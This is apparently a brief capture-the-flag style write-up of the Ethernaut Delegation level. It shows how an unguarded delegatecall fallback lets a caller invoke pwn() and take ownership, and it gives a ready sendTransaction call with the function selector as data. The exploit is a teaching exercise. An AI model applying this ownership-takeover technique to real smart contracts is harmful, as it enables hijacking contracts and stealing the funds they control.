Delegate call is a special, low level function call intended to invoke functions from another contract.

Here, we need to call the fallback function by passing data as - web3.eth.abi.encodeFunctionSignature("pwn()")
this will call the pwn function in the Delegate contract and our address will be the owner

await sendTransaction({
  from: "0xf9B888aA7CDBD123FA59571a19449C85017ca833",
  to: "0xf8C335eE5a3198550877a543F72dB86443379c5e",
  data: "0xdd365b8b0000000000000000000000000000000000000000000000000000000000000000"
})

Also when the delegat call is done, the EOA will be the one who calls the pwn function and not the contract so the msg.sender is actually us. This is not the same for the normal call where the contract becomes the msg.sender.